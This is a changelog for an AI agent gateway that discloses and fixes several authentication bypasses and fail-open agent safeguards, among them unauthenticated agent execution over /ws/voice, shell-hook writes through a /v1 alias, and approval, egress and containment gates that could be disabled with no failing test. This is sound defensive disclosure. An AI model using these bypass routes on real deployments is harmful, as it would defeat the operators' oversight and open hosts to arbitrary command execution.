- Behaviour changes, deliberate: (1) **legacy mode (`authStrict:false`) now
  also protects the artifacts API** — a tightening, no capability lost; (2)
  `p.startsWith("/ui/")` was removed from both auth branches — **no route has
  ever served `/ui/*`**, so an unauthenticated request there now answers `404`
  instead of `401`; nothing became reachable. The default (`publicUi`
  unset/true) path is byte-identical to before, verified by re-running the
  same three-gateway probe after the fix.

## 3.191.0 (2026-08-25)

- SECURITY (a third authentication bypass, same root cause shape as the two in
  3.190.0: one question answered by two different functions). **`/ws/voice`,
  the WebSocket that runs the agent, accepted unauthenticated upgrades on a
  token-protected gateway** from 3.131.0 (`b4ecb14`, 2026-08-17) through
  3.190.0 — roughly 66 releases.
- The gateway has two upgrade endpoints. `/ws/events` is read-only and asks
  `gatewayAuth.authorizeWebSocket(req)`, which answers a path-independent
  question: *is a token configured, and did the caller present it?*
  `/ws/voice` was handed the auth object instead of that function, and its
  gate opened with `if (auth.isProtectedPath("/ws/voice") && auth.check)`.
  No protection list — `core`, legacy, strict, or the publicUi branches —
  contains a `/ws/` entry, because that list describes HTTP routes. So the
  condition was false in every configuration, `check` was never called, and
  the guard was dead code that read like enforcement.
- What that socket reaches: a client message `{"type":"command","text":"…"}`
  is handed to `runVoiceTurn` → `runAgent({ goal, cfg, channel: "voice", … })`
  with the full tool pack, streaming tool events back. Unauthenticated agent
  execution, not an information leak.
- Reproduced on the running production gateway before any source was changed:
  an upgrade to `/ws/voice` with no credentials returned `101 Switching
  Protocols`, the server sent `{"type":"ready","sessionId":…,"workingDir":
  "/root/.xclaw/workspaces"}`, and a client `{"type":"ping"}` was answered
  with `pong`. The same socket to `/ws/events`, same server, same token,
  returned `401`.
- Fix: `/ws/voice` is given the **same** `authorize` lambda `/ws/events` gets,
  and the voice module now performs that one decision before the handshake —
  401 on refusal, and on success it echoes `Sec-WebSocket-Protocol` so the
  browser token carrier still completes. `isProtectedPath` was deliberately
  **not** extended with `/ws/` paths: adding a second source for the same
  answer is what caused this bug three times running.
- Tests at both levels, because only one of them can catch this. `ws-auth`
  (6 → 13 cases) runs every credential case against both endpoints through a
  single shared `authorize`, with a mirror-pair accept for every refusal.
  `gateway-auth-enforcement` (10 → 15) drives raw upgrade sockets against a
  real spawned `bin/xclaw.mjs gateway`. Mutation-swept: no-op the gate → both
  go red; **revert only the `index.mjs` wiring → the unit test stays green and
  only the child-process test goes red**, which is the exact defect that
  shipped, so the in-process test alone would never have found it.
- The blind spot is the same one the previous five sweeps found: the pure
  decision (`authorizeWebSocket`) was correct and tested; the half that
  *performs* it had no behavioural test. `voice-pcm-ws.test.mjs` tested frame
  encoding and `voice-ws-protocol.test.mjs` grepped the source for handler
  strings — neither had ever opened a socket to `/ws/voice`.

## 3.190.0 (2026-08-25)

- SECURITY (two authentication bypasses on the gateway, one root cause shape:
  the same decision made in two places). Both let an unauthenticated caller
  reach routes the gateway believes are protected. Both were found by mutation
  sweeping the auth surface — no-op an enforcement line, run the suite — and
  both were reproduced over a real socket against a real spawned gateway
  before a line of source was changed.
- **1. `/v1/<route>` bypassed auth entirely.** The router treats `/v1/` as an
  alias for every route: it strips the prefix and dispatches the remainder.
  `check()` did not. It re-derived the path from the raw `req.url`, saw
  `/v1/hooks`, matched nothing in the protected list (which holds `/hooks`)
  and returned `{ ok: true, mode: "open" }`. So every protected route had an
  unauthenticated twin, one prefix away — `/v1/hooks`, `/v1/tokens`,
  `/v1/computer/...`, `/v1/profile`. Command hooks execute arbitrary shell on
  the host, which is why the protected list carries them. Shipped in 3.83.0
  (`d4f48d6`, "API versioning: /v1 alias"), open for 161 releases; proven
  pre-fix by writing a command hook to disk through `POST /v1/hooks/commands`
  with no credential. `stripApiVersion()` is now the single normalization both
  callers use, and the gateway passes `check()` the exact string it routes on.
- **2. The computer plane was reachable through the gateway with no token.**
  `/computer/proxy/*` and `/xclaw/computer/*` forward to the computer plane,
  whose `POST /tool` runs any tool — `bash` included — and authenticates
  nothing itself, by design: it is meant to sit behind the gateway. It did
  not. `createHttpServer` (`src/gateway/tls.mjs`) dispatched the proxy in its
  wrapper, *ahead of the request listener* — and the 401 gate lives inside
  that listener. Every request to those prefixes returned before reaching it.
  Any gateway with the proxy enabled — it is **default-on** — served the full
  computer plane to anyone who could open a socket to the port. Shipped in
  3.132.0 (`7d57f68`, 2026-08-18), open for 88 releases.
- Reordering the dispatch inside `index.mjs` alone was a **no-op** — the first
  run of the new test caught exactly that, still returning 200 without a
  token, because the wrapper answered first. The fix is that the wrapper no
  longer proxies at all: `wrapWithStopIntercept` now runs only the `/stop`
  kill switch (which carries its own `authorizeStop`, needs the body unparsed,
  and has no route in the router to fall through to), and the proxy is
  dispatched from exactly one place — inside the listener, below the gate.
- The protected-path list also missed `/xclaw/computer/` outright:
  `p.startsWith("/computer/")` covers one of the two prefixes and not the
  other. It is now derived from `COMPUTER_PROXY_PREFIXES`, the same constant
  the proxy matches on, so the list cannot fall behind the router again.
- Auth now runs **before** the proxy and before `applyCors`; a 401 applies CORS
  headers explicitly, or a browser client sees an opaque network error instead
  of the status. Proxied responses still keep the upstream's own CORS headers.
- `test/gateway-auth-enforcement.test.mjs` — new, 10 cases, all over real
  sockets against `bin/xclaw.mjs gateway` spawned in a temp `HOME` (the pure
  `createGatewayAuth()` half was already well covered; the half that *performs*
  the 401 had no test at all, which is what let both defects live). Cases come
  in mirror pairs differing only by the `Authorization` header, so a gate that
  refuses everything fails as loudly as one that refuses nothing. The proxy
  cases assert the upstream hit list is **empty** without a token — a 401 can
  come from anywhere, but "the computer plane was never contacted" can only be
  true if the gate ran first. `/health` and `/v1/health` must both still
  answer 200, pinning that the prefix is stripped rather than blanket-refused.
- Mutation-verified, each turns the suite red: gate no-op → 5 fail; `check()`
  re-deriving from `req.url` → 1 fail; dropping `COMPUTER_PROXY_PREFIXES` from
  the protected list → 1 fail; restoring the proxy in the wrapper → 3 fail.
- `test/gateway-tls-proxy-wrap.test.mjs` **pinned the vulnerable ordering**
  ("proxies before the inner listener") and passed for 88 releases. It now
  pins the inverse, plus that the kill switch still runs ahead of the router.
  Three other proxy tests dispatched through the wrapper the same way; they
  now mirror the real gateway and dispatch inside their listener.

## 3.189.0 (2026-08-25)

- FIX (documented capability with no implementation) — `XCLAW_GATEWAY_HOST`,
  `XCLAW_GATEWAY_PORT`, `XCLAW_COMPUTER_HOST` and `XCLAW_COMPUTER_PORT` were
  never read by any code. They are announced in 3.76.0 as "Env bind overrides
  (`XCLAW_GATEWAY_HOST/PORT`, `XCLAW_COMPUTER_HOST/PORT`, token via env) so
  compose-published ports work" (CHANGELOG.md:3284), documented in
  `INSTALL.md`, and exported by `deploy/Dockerfile`,
  `deploy/docker-compose.yml` and `deploy/docker-compose.sidecar.yml` — with an
  explanatory comment on the line. `loadConfig` read `XCLAW_COMPUTER_URL` and
  a dozen other variables; it never read these four. Proven before the fix:
  with `XCLAW_GATEWAY_HOST=0.0.0.0 XCLAW_GATEWAY_PORT=19999` exported,
  `loadConfig()` returned `127.0.0.1:18790`.
- Consequence was worse than "the setting does nothing". A container binds
  inside its own network namespace, so the process listened on the container's
  loopback and `-p 18790:18790` published a port that reached nothing — while
  the image's own `HEALTHCHECK` (`curl -fsS http://127.0.0.1:18790/ready`, run
  **inside** the container) hit that same loopback listener and reported
  healthy. Docker said healthy; no client outside the container could connect.
  Same shape for the 4243 computer port and for the sidecar layout, where the
  computer service is reached over the compose network by name.
- `applyEnvBindOverrides()` in `src/config/load.mjs` now applies them last, so
  env beats the file, matching `XCLAW_MODEL` / `XCLAW_SSRF`. Each axis is
  independent (host from env, port from config is the sidecar's exact shape).
  A port that is not an integer in 1–65535 is **reported and ignored**, never
  silently dropped — silent drop is the failure being fixed.
- SECURITY (consequence of the above): honouring the host makes the 3.188.0
  bind guard load-bearing for containers. `XCLAW_GATEWAY_HOST=0.0.0.0` with no
  token now refuses to start instead of quietly binding loopback, so both
  compose files require `XCLAW_GATEWAY_TOKEN` via `${XCLAW_GATEWAY_TOKEN:?…}` —
  compose fails at parse time with the `openssl rand -hex 32` command in the
  message rather than starting a container that dies on boot.
  `XCLAW_GATEWAY_ALLOW_OPEN=1` remains the documented opt-out for a trusted,
  unpublished network. `INSTALL.md` and `deploy/Dockerfile` say so at the point
  of use.
- Tests: `test/config-env-bind-overrides.test.mjs` (7) — every case has a
  mirror one env var away, so a `loadConfig` that always returned the env value
  and one that always ignored it each fail a pair; plus warn-and-ignore for a
  non-numeric and an out-of-range port. `test/gateway-bind-guard-enforcement.test.mjs`
  gains a 5th case for the exact container shape: config says loopback, env
  says `0.0.0.0`, no token, must refuse. Mutation-checked — dropping the
  `applyEnvBindOverrides` call fails 5 of 7 plus that case; making the invalid
  port silent fails 2.
- Method note, same as 3.188.0: the four variables were *set* in three deploy
  files and *documented* in two, which reads exactly like a wired feature. What
  distinguishes a wired capability from an announced one is a test that runs
  the product path, not a grep for the variable name.

## 3.188.0 (2026-08-25)

- SECURITY (regression, not a coverage gap) — the gateway bind guard had **zero
  production call sites**. `assertBindSafety` was wired into `startGateway` by
  3ad09af (v3.76.1, 2026-08-12 16:29:12) and lost its call site 34 minutes later
  to c9a5b10 ("feat(automations): schedule prompts…", 17:03:07), an unrelated
  feature authored against a pre-guard tree. c9a5b10 is an ancestor of HEAD, so
  from that commit until now the product never asked the guard anything, while
  CHANGELOG (3.76.1) and `docs/GROK-PROGRESS.md:162` both kept advertising the
  protection. Effect: `gateway.host` set to a non-loopback address with no token
  bound and served, because `createGatewayAuth().check()` answers
  `{ ok: true, mode: "open" }` for protected paths when no token is configured
  outside prod — exposing `/agent`, `/config`, `/sessions` and `/hooks` (command
  hooks EXECUTE shell) to every interface. The only remaining notice was
  `validateConfig`'s advisory "gateway.host is 0.0.0.0 (public bind)" warning,
  which refuses nothing. Confirmed empirically before the fix: `0.0.0.0` with no
  token behaved identically to `127.0.0.1`.
  Not currently exploitable on this host — the live gateway runs `profile: lab`,
  `host: 127.0.0.1`, token set — but latent for any operator who opens the host.
- SECURITY — guard re-wired in `startGateway`, deliberately EARLIER than the
  original placement: adjacent to `loadConfig()` rather than just before
  `server.listen`, so a refusal happens before channels, the computer subprocess
  or any other resource is constructed. `XCLAW_GATEWAY_ALLOW_OPEN=1` and
  `gateway.token` remain the two documented ways to bind wide on purpose.
- TEST — `test/gateway-bind-guard-enforcement.test.mjs` pins the call site, four
  cases, one field apart: public host with no token must refuse; loopback with
  no token must not; public host WITH a token must not; public host with
  `XCLAW_GATEWAY_ALLOW_OPEN=1` must not. Verified red under the single mutation
  `if (false && !bindSafety.ok)` (`# fail 1`, only the refusal case) and green
  reverted. No port is ever bound: `startGateway({})` is called with no `root`,
  so a case that gets past the guard dies on the very next statement
  (`path.join(root, "ui", "webchat")` → `TypeError`), which is the pass-through
  marker the mirror cases assert on.
- Note — the two existing files (`test/bind-safety-prod.test.mjs`,
  `test/security-top-fixes.test.mjs`) both call `assertBindSafety` directly and
  were correct the whole time. This is the sweep's recurring shape — pure half
  covered, call site not — taken to its limit: the call site did not exist. A
  guard with no callers is indistinguishable, in a green suite, from a guard
  that works.

## 3.187.0 (2026-08-25)

- SECURITY/TEST — mutation sweep of the approval GATE itself
  (`src/security/approvals.mjs`), the counterpart to batches A–E which swept its
  caller. Twelve enforcement lines in `authorizeInner`/`needsApproval` were
  replaced with no-ops one at a time against the full suite; nine were caught,
  three were not. The gate could refuse nothing in three ways and 3042 tests
  stayed green:
  - `if (!isExecCommandAllowed(name, args))` — the operator's
    `security.execAllowlist` / `execPatterns`. `commandMatchesExecAllowlist` has
    its own suite and exactly one call site in the product (approvals.mjs:210),
    reached only from this refusal; no test anywhere sets the config key, so the
    allowlist was inert product-wide with nothing to notice.
  - `if (q && q.ok === false)` — the workspace quota preflight.
    `authorizeQuotaPreflight` has four dedicated test files, every one of which
    imports it directly and never builds a gate. It too has one call site, and
    `src/security/workspace-quota.mjs` is consumed only through it — with the
    refusal gone the whole subsystem measured, warned, tripped its circuit and
    then let the write proceed.
  - `if (critical) return true;` — the novel-danger rule, and the most serious
    of the three. `security.requireApproval` defaults to `EXEC_TOOLS`
    (bash/shell/exec/…) with no file tools in it, so the name-list line below
    says "auto" for a `file_write` however dangerous. This one line is the only
    reason a critical-tier write pends under the shipped default: exactly the
    live-fired v3.126.0 behaviour, where an outside-workspace write used to
    auto-run with no record.
  Same shape as every earlier finding — the pure half exhaustively covered, the
  call site not — and no product code needed changing: the enforcement was
  correct, only unpinned.
- TEST — `test/approval-gate-enforcement.test.mjs` closes all three, both
  directions, one field apart: the command, the byte ceiling, the target path.
  Each was verified red under its own single mutation (`# fail 1`, and only its
  own case) and green reverted. The exec and quota pairs set
  `autoApprove` + `criticalOverride: "legacy"` so the approval decision cannot
  become what stops the call; the critical pair must do the opposite, running
  the shipped defaults and asserting a human was ASKED — under the mutant the
  same call returns `mode:"auto"` with `onPending` never fired. `awaitingHuman`
  is `false` on a deny, which is the point of the field: an operator answer is
  final, and reading `pendingId` as pendency was the 3.180.0 bug.
- Note — the gate's `check()` (approvals.mjs:536) has zero callers in `src/`,
  `bin/` or `test/` and is a weaker duplicate of `authorize` (no risk argument,
  so none of the A2/critical logic). Left in place as part of an exported
  object's public shape; recorded here as a deletion candidate.
  3048 tests, 0 failures.

## 3.186.0 (2026-08-25)

- SECURITY — the gateway belt for browser-tab calls failed OPEN. `loop.mjs`
  wrapped the whole belt in one `try`: resolve role, ask the fabric hooks for a
  verdict, dispatch if permitted — and its `catch (beltErr)` dispatched the call
  anyway, with the error bound and never read. No event, no log, and the
  metadata the normal path attaches (`plane`, `durationMs`) lost. Any throw in
  the DECISION phase therefore performed the ACTION unchecked. A second defect
  sat in the same block: when the dispatch INSIDE the try threw, the catch
  dispatched a second time — one browser action executed twice.
  `test/loop-browser-hook-enforcement.test.mjs` had noted the fail-open and
  declined to test it, reasoning that "today's hooks return typed results and do
  not throw". True of the two entry points, false of the graph beneath them:
  `beforeInput` → `requireTabLease` → `acquireTabLease` → `withFabricLock` →
  `fs.mkdir(fabricRoot())`, uncaught the whole way. Under
  `XCLAW_FABRIC_ENFORCE` with auto-acquire, an unwritable fabric root — full
  disk, revoked mount, stale `XCLAW_FABRIC_DIR` — turned a lease requirement
  into a browser action with no lease and no verdict at all. The stronger the
  enforcement config, the more code runs inside the try and the more ways it
  has to fail open. Decision and action are now separate phases: hook errors
  deny with a typed `[xclaw-hooks] HOOK_ERROR:` result the model sees and a
  `security`/`browser_belt_error` event carrying the cause, and
  `toolRouter.dispatch` runs exactly once, outside the try — so a dispatch
  throw propagates like every other tool's instead of re-running the action.
  Not reachable on the live gateway today (`fabricEnforce()` is off there, so no
  lease work runs), which is what made the fix safe to land unattended.
- TEST — `test/loop-belt-failclosed.test.mjs` pins it, both directions under one
  config. The throw is forced hermetically by pointing `XCLAW_FABRIC_DIR` under
  a parent that is a regular FILE, so the recursive `mkdir` raises `ENOTDIR`;
  mode bits would not do, since the suite runs as root and root ignores them.
  Verified against the unfixed loop: the call reached the tool (the schema's
  `InputValidationError` came back), which is the fail-open. The mirror changes
  only the fabric root and must reach dispatch, so a belt that refused every
  browser call cannot satisfy the pair. Also required
  `XCLAW_ROLE_FROM_ENV=1`: strict mode ignores `XCLAW_AGENT_ROLE` and defaults
  to `observer`, which the hook denies for motor before any lease is touched.
  3042 tests, 0 failures.

## 3.185.0 (2026-08-25)

- TEST — the two suite flakes seen across nine full runs are fixed at the root.
  Neither was what the symptom suggested. Both files pass in isolation every
  time, so they were reproduced against a deliberately loaded box (12 spinners
  on 4 cores): `approval-path-latency` then failed 3 of 5 rounds and
  `objective-channel` 4 of 5, deterministically enough to work with.
  `approval-path-latency` was failing on `list.length >= 1`, never on a latency
  bound — a fixed 15ms sleep was standing in for synchronisation, and under
  contention that much wall clock can pass without the gate's pending-record
  continuation running at all. It now polls. The elapsed-time assertions
  (`< 1500ms`, `>= 50ms`, `< 100ms`) never fired in any loaded round and are
  left exactly as they were, rather than loosened on suspicion.
  `objective-channel` was failing in teardown: a detached mission keeps writing
  after the status the test polls for lands, and `saveObjective` renames through
  a per-call `.tmp-*` file, so a recursive `fs.rm` could list a directory and
  then meet a fresh temp file before the `rmdir` — `ENOTEMPTY`. Teardown now
  uses `fs.rm`'s own `maxRetries`/`retryDelay` backoff and still propagates if
  the directory never settles. Same load, same commands, after: 12/12 green.

## 3.184.0 (2026-08-25)

- TEST — context eviction was covered as an algorithm and nowhere as wiring.
  `evictMessages` has exactly one caller in the tree, and both suites that
  exercise it import the pure functions directly, so no-op'ing the loop's
  branch (`if (false && evictOpts.enabled && ...)`) left the suite green while
  every tool result a session ever produced went to the provider.
  `test/loop-eviction-enforcement.test.mjs` drives four ~1.4KB results against a
  4000-char budget and asserts on the array the model is handed: oldest shed and
  marked, newest intact; the mirror flips only `tokens.eviction.enabled` and
  requires all four whole. Per-result truncation and compaction are switched off
  in the fixture — with compaction on, it, not eviction, was doing the shedding.
  `cache`/`pressure` is deliberately not asserted: it is measured above the
  branch and fires under the mutation too.

- TEST — the per-turn system-prefix re-pin (`restorePrefixEachTurn`) could be
  deleted with the suite green: `ensurePrefixStable` had one caller and its test
  imported it directly. Under the mutation every run falls through to the
  assert-only branch, which warns and sends the drifted prefix anyway — losing
  the cache hit and the guarantee that turn N+1 carries turn 1's instructions.
  `test/loop-prefix-enforcement.test.mjs` corrupts the live prefix from inside
  `provider.chat` (the messages array is shared by reference; the frozen system
  object is not assignable, but a rogue system message can be unshifted ahead of
  it) and asserts turn 2 is byte-identical to turn 1; the mirror sets
  `tokens.restorePrefixEachTurn:false` and requires the drift to survive with a
  `prefix_drift` report.

- DOCS — `src/agent/loop.mjs` on_stop gate: recorded why the `loopGuardStop` and
  `lastPendingApproval` conjuncts are dominated by `naturalStop` today (both are
  set only on a batch stop, which breaks out in a turn where `naturalStop` is
  false), making their deletion an equivalent mutant, and why the abort check is
  not. They stay as defense in depth against a future edit.

## 3.183.0 (2026-08-25)

- TEST — tool-output truncation was covered as a pure function and nowhere as
  wiring, so the loop was free to stop calling it. Deleting the call in
  `src/agent/loop.mjs` (`const trunc = (truncOpts.enabled && false) ? ... `)
  left the suite green at 3032 tests while a 23,893-char command result went to
  the provider whole — the context blow-up the cap exists to prevent.
  `test/loop-truncate-enforcement.test.mjs` asserts on the tool message the
  provider is actually handed: capped, marked `[truncated N of M chars]`, middle
  omitted; the mirror flips only `tokens.truncate.enabled` and requires all
  23,893 chars through. The `tool/end` truncated/originalChars/keptChars fields
  are checked but not relied on — they are emitted either way.

- TEST — the gateway belt's hook refusal for browser tab calls
  (`if (hr && hr.ok === false)`) could be deleted with the suite green.
  `assertJsCodeAllowed` has exactly one caller, `src/browser/hooks.mjs`, and the
  bundled engine carries no jsCode policy of its own, so with the short-circuit
  gone a motor-pattern `jsCode` aimed at a live tab is dispatched and runs
  against the page — the synthesized-click bypass the hook exists to close. The
  mutation still LOOKS refused when the tab does not exist, which is why
  `test/loop-browser-hook-enforcement.test.mjs` asserts the `[xclaw-hooks] `
  prefix (written by that block alone) rather than that the call failed, and
  why `!started` is unusable here: the belt runs after `tool/start` is emitted.
  Both cases return before any Chrome or network work, per the house rule in
  `test/browser-tab-native-cdp.test.mjs`.

## 3.182.0 (2026-08-25)

- FIX — the loop's budget pre-check re-threw its own refusal by matching
  substrings of the error message: `"hard cap"` or `"Hard daily"`. The daily
  cap message happens to contain those words; the other refusals the same gate
  produces do not. `Seat <label> is paused`, `Seat <label> disabled`, `Per-job
  cap $X exceeded` and every `SEAT_CHECK_ERROR` were therefore caught and
  discarded right where they were raised. Those runs were still stopped — the
  per-turn pre-flight calls the same `checkLoopCostBudget` a moment later — but
  they got there by way of `ensureComputer()` and `createSession()`, which is
  precisely what a *pre*-check exists to happen before. The refusal now carries
  `budgetBlock`/`code`/`blockedBy` on the Error and the catch keys on the
  marker, so a genuinely optional failure (missing module, unreadable ledger)
  still falls through and control flow no longer depends on wording.
- TEST — `test/loop-budget-enforcement.test.mjs` (new, 6 tests) covers the two
  enforcement blocks the mutation sweep could delete with the suite green: the
  cost pre-check (`if (false && !budget.ok)`) and the quota hard-block circuit
  (`if (false && circ && circ.ok === false)`). Both survived because a second
  gate absorbs them, so "the run was blocked" is not a discriminating
  assertion — these tests require the loop to *throw* and to emit no
  `computer/session` event, which is exactly the property the mutation
  destroys. The circuit cases source the tripped flag from `receiptCollector`
  rather than `job`: a tripped circuit on `job` is also read by the cost
  governor at turn pre-flight, which would stop the run with the dispatch guard
  deleted. Every case has a mirror that flips one field — the cap, the seat's
  `paused`, the circuit's `tripped` — and requires the run to complete and the
  model to be called, so a gate that refuses everything fails.
- TEST — `quota-hard-circuit-wire` and `loop-cost-auth-wire` each asserted that
  a file under `patches/` mentions the guard. Those files are inputs to a past
  migration, not the shipped code: both guards could be deleted from
  `src/agent/loop.mjs` and both assertions still held. Replaced with pointers
  to the behavioural coverage above.

## 3.181.1 (2026-08-25)

- TEST — deflake `approval SLA`. The test started `authorize()`, slept a fixed
  20ms, then asserted `listPending()` was non-empty. `authorize` registers the
  pending entry only after its own awaits, so under a loaded event loop —
  the full suite, or CI — 20ms of wall clock can pass before registration and
  the list comes back empty. It never fails solo (25/25 clean) but reproduces
  under CPU contention (1/15). Now polls to the registration with a 4s
  deadline, still well inside the 5s authorize timeout, so the entry is
  genuinely pending when read: 0/20 under the same load. The assertion still
  bites — stubbing `listPending()` to return `[]` fails it at the deadline
  with "authorize never registered a pending approval".

## 3.181.0 (2026-08-25)

- FIX — post-mission reflection was building the wrong provider and 401'd on
  every real mission since v3.179.0. `reflectOnMission` called
  `createProvider(cfg)` — the config object passed where the options bag
  (`{apiKey, baseUrl, model, provider, api}`) belongs — so it produced an
  unauthenticated OpenAI client on `gpt-4o-mini` instead of going through the
  router. The W3 learning write-path therefore wrote zero lessons in
  production the entire time the tests said it worked, because every test in
  `memory-reflection.test.mjs` injected `deps.provider` and none of them ever
  executed the construction path. A second fault hid the first: the failure
  path was `catch { return null }` and the caller only logged truthy results,
  so a permanently broken reflection was byte-identical, in the log, to a
  healthy mission with nothing to learn.
- `src/agent/provider-factory.mjs` (new) is now the single way to build a
  provider from config: resolve the route, then construct with the resolved
  `apiKey`/`baseUrl`/`model`/`provider`/`api`. It is a leaf module because
  `providers/failover-router.mjs` imports back into `agent/provider.mjs`, and
  a cycle on that path is a TDZ hazard on the hot loop. Reflection and both
  of the loop's own construction sites call it — the loop's two copies of
  that 27-line block were byte-identical, which is how reflection was able to
  drift from them unnoticed (−53 lines).
- Reflection now returns `{written, error?}` instead of `null` on failure, and
  `objective.mjs` logs all three outcomes distinctly: `reflection wrote N
  lesson(s)`, `no transferable lessons` (a real result — a trivial mission),
  and `reflection failed: <error>`. A silent failure of this shape cannot
  recur without a log line.
- TEST — the wiring itself is now covered, in the only way that works:
  by NOT injecting the seam. `memory-reflection.test.mjs` gains a case that
  omits `deps.provider`, clears every provider env var, repoints `HOME`, and
  points `cfg.agent.baseUrl` at a local HTTP server — so only a correctly
  routed provider can satisfy it. Reverted against the v3.179.0 code it fails
  with the exact production error (`Provider HTTP 401: You didn't provide an
  API key`). `loop-provider-wiring.test.mjs` (new) does the same for the loop:
  every other loop test passes `options.provider`, so the loop's construction
  path had no coverage at all. Both the router path and the
  `router.enabled:false` single-provider fallback are asserted to reach the
  configured route with the configured credential; mutating the fallback back
  to `createProvider(cfg)` turns that case red.
- Live-proven end to end on the real gateway, not just in tests: mission
  `obj_mt8ncee7_e83df2` ran to `done` and logged `[objective] reflection wrote
  2 lesson(s)`, with both typed `lesson` events landing in durable memory with
  their `objectiveId` provenance. That closes the `reflection trigger
  UNVERIFIED-live` item carried since v3.179.0.

## 3.180.2 (2026-08-25)

- SECURITY — five more loop enforcement blocks are now under behavioural
  test. The mutation sweep continued through the rest of the pre-dispatch
  chain and found four blocks that can be replaced with a no-op while all
  3016 tests stay green, plus one already closed by the pairing work:
  `guardToolPaths` (workspace containment), `guardToolEgress` (the outbound
  network screen), `guardHighRiskReceipt`, and the `systemRunPlan` carry
  that hands the gate's frozen plan to the executor. Every one of those
  guards has unit tests — which call the guard directly, prove the verdict
  is COMPUTED correctly, and say nothing about whether the loop obeys it.
  Delete the three `if (!ok) return;` blocks and every unit test still
  passes while containment, egress and the receipt requirement are off in
  the product. `loop-guard-enforcement.test.mjs` drives the real
  `runAgentLoop` for each: a `cwd` pointing at a sibling of the workspace, a
  `curl` under `egress.mode=deny`, a high-risk exec with no evidence — each
  asserted to emit its denial, never reach dispatch, and never land its side
  effect on disk. Each has a mirror running the SAME tool under the SAME
  config with only the guarded field changed, so no pair can be satisfied by
  a guard that denies everything. The plan carry is asserted on the payload
  dispatch actually receives: `argv` and `cwd` chosen by the test at runtime,
  so no constant plan satisfies it. Without that block the router cannot
  compensate — it backfills from `req.plan`, which the loop sources from the
  very field the block sets — so the bundle's spawn-time argv/cwd check
  would have had nothing to compare against. All four mutations fail the new
  tests; each is killed only by its own.
- The tool_call/tool_result pairing invariant is now enforced under test.
  Mutating loop.mjs's backfill to `for (const skip of [])` disables it for
  every run and left the suite green. In production a mid-batch stop —
  pending approval, guard denial, quota — leaves later calls unexecuted with
  their ids already in the transcript, and an orphaned `tool_use` id 400s the
  very next Anthropic request. `loop-stage-enforcement.test.mjs` drives a
  real two-call batch where the first pends unanswered, asserts the dropped
  call is answered with `turn_stopped` and never executed, and mirrors it
  with a batch that completes and must stay silent.
- Recorded honestly: a fifth candidate — the workspace `cwd` pin at intake —
  is an equivalent mutant, not a blind spot. Removing it changes nothing
  observable because the property is held by three redundant mechanisms
  (intake pin, local-tool binding at registry creation, the gate's plan
  root); only removing all three fails, and three existing tests already
  catch that. No test was written for it.

## 3.180.1 (2026-08-25)

- Approval pendency is now a DECLARED field instead of an inference.
  3.180.0 fixed the loop reading `pendingId` as "still pending" by
  enumerating reason strings, which was the declared weakest point of that
  release: a convention the gate was never obliged to honour. Any future
  verdict reason containing the substring "timeout" — say
  `exec_timeout_policy` — would have reproduced the same bug one level up.
  `authorize` now stamps a boolean `awaitingHuman` on every answer it
  returns, at ONE boundary (a `stampAwaitingHuman` wrapper, mirroring the
  existing `stampOperatorChecks` idiom) rather than at eight return sites,
  and `UNANSWERED_APPROVAL_REASONS` is exported as the single source of
  truth. The loop believes the gate's claim and falls back to the
  enumerated list only for injected doubles and gates that predate the
  field. `approval-pendency-contract.test.mjs` drives the real gate through
  all four paths — policy verdict, approve, deny, timeout — and pins the
  deny/timeout pair, identical down to the `pendingId` and opposite on
  pendency, which is what makes a constant stamp impossible. Six mutations
  (constant stamp, no stamp, loop ignores the field, either list drifting,
  reverting to `reason.includes("timeout")`) all fail it.
- SECURITY — the run-scoped tool allowlist (`cfg.agent.allowTools`) is now
  under behavioural test. Same blind spot class as the TOCTOU block in
  3.180.0, found by continuing the mutation sweep: changing loop.mjs's
  enforcement to `if (false && allowBlock)` disables the allowlist for every
  run in the product and left all 3012 tests green. The pure stage
  `evaluateRunAllowlist` had unit tests; the half that performs the block
  had none. `loop-allowtools-enforcement.test.mjs` drives the real
  `runAgentLoop` with a model that hallucinates a tool the run was never
  offered, and asserts the exec never reaches dispatch and its side effect
  never lands on disk — plus the mirror case, where the same tool under a
  permissive allowlist must actually run, so the pair cannot be satisfied
  by a filter that blocks everything. Both mutations fail it.

## 3.180.0 (2026-08-25)

- SECURITY — an operator's Deny was reported as "still awaiting approval".
  `planApprovalOutcome` treated `Boolean(auth.pendingId)` as pending, but
  `authorize` stamps `pendingId` onto EVERY answer it returns on the human
  path (`return {...decision, pendingId: id}`), verdicts included. So a
  tapped Deny stopped the turn instead of continuing it, went out as
  `approval_required` with `restate:true` (which `isNewApprovalAsk` filters,
  so telegram's `phase === "denied"` branch never fired and
  `recordTelegramDeny` never counted a denial), showed the operator
  "BLOCKED … awaiting approval" for the call they had just refused, and
  skipped `guard.record` so repeated denied retries stopped feeding
  stagnation detection. Decide-time drift verdicts (plan_drift,
  fingerprint_mismatch) were swallowed the same way — a TOCTOU block
  reported as "awaiting approval". Pending is now a claim about the REASON:
  `pending`, the timeout family (timeout / sla_timeout /
  sla_timeout_critical — all mean the window closed with nobody answering),
  an explicit `pending:true`, or a bare id with no reason at all.
- The loop's post-approval ENFORCEMENT is now under behavioural test.
  W2 moved the decision logic into pure stages and left the side effects in
  loop.mjs; the stages got exhaustive unit tests, the half that PERFORMS
  them got source-greps. Mutation testing proved the hole: deleting the
  whole post-approval TOCTOU block, and deleting the approval-outcome event
  emission, both left the full suite green. `loop-toctou-enforcement.test.mjs`
  drives the real `runAgentLoop` and produces the drift the way the real
  threat does — the approved cwd swapped for a symlink from inside the
  approval window — then asserts the call never reaches execution. Both
  mutations fail it. The deny bug above was found by writing it.
- CHANNELS — a declined start counted as a successful restart. The manager
  returned `{ok:true}` unconditionally, so the health watchdog reset
  `consecutiveFail` every pass, its circuit-open alert became unreachable,
  and it restart-looped a permanently dead channel in silence. Worse, a
  standby instance owns no poll loop but `stop()` fired getUpdates
  unconditionally to interrupt one — on a shared token that 409-terminates
  whichever process IS polling, so every watchdog pass killed the real
  writer. Declines that no restart can fix (missing webhookUrl,
  single-writer lock held elsewhere) now report `{started:false}`; the
  interrupter fires only when we own the loop; the watchdog skips standby.
- COMPUTER — five sites still read the raw engine selector after ADR 0006.
  capability-reach advertised `screenshot:false`/`fullBrowser:false` on a
  node configured `engine:"native"`, so the agent stopped attempting two
  capabilities the bundle has; computer-client had session reuse inverted
  (naming the engine you actually run turned reuse off); extraction-status
  reported ADR 0005's retired shape; computer-act-tool reported
  `engine:"native"` on error results. Separately, `ensure-computer` lost its
  identity check in the A6 merge and adopted ANY 200 + JSON on the computer
  port — a foreign local service holding 4243 was adopted as the computer
  server, the script exited 0, the real server never started, and every
